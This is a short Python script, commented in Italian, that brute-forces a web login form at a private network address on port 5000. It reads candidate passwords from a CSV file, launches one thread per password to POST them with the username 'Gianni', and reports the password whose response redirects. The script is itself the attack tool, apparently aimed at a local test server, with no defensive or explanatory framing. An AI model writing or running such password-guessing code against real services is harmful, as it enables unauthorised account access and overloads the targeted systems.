import requests
import csv
import threading as thr
url = 'http://192.168.0.141:5000/'
passwordlist=None
with open('psw.csv') as csv_file:
    csv_reader = csv.reader(csv_file, delimiter=',')
    line_count = 0
    for row in csv_reader:
        passwordlist = row

lista = []
sbagliato = True

giusta = None 
    
def faiRequest(password, username = "Gianni"):
    global giusta
    global url
    try:
        myobj = {'username': username,'password':password}
    
        x = requests.post(url, data = myobj)
        print(password)
        if(x.url!=url):
            giusta = password
            #url = "http://127.0.0.1:5000/test/"
            print(f"trovato {giusta}")
            #print(x.url)
            return
    except:
        pass
    return

#print(passwordlist)
for password in passwordlist:
    
    if not giusta:
        thr.Thread(target=faiRequest, args=(password,)).start()
        
    
    #faiRequest(password)
        

